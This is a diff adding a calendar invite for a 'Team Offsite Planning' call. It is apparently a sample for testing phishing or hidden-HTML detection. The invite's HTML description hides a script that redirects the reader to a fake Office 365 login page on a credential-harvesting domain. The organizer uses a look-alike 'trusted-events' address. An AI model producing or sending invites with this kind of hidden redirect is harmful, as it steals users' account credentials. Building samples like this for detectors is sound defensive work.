@@ -1,0 +1,21 @@
+BEGIN:VCALENDAR
+VERSION:2.0
+PRODID:-//Example//EN
+METHOD:REQUEST
+BEGIN:VEVENT
+UID:html-hidden-0001@mail.example.net
+DTSTAMP:20251125T031000Z
+DTSTART:20251126T110000Z
+DTEND:20251126T120000Z
+SUMMARY:Team Offsite Planning
+ORGANIZER;CN="Events Team":mailto:events@trusted-events.co
+ATTENDEE;CN="Zhang Min";RSVP=TRUE:mailto:zhang.min@example.com
+LOCATION:https://trusted-events.co/offsite
+DESCRIPTION;FMTTYPE=text/html:<html><body><p>Join the planning call:</p>
+ <p>https://trusted-events.co/offsite</p>
+ <script>location.href="https://harvest-credentials.cyou/office365/login";</script>
+ </body></html>
+URL:https://trusted-events.co/offsite
+SEQUENCE:0
+END:VEVENT
+END:VCALENDAR
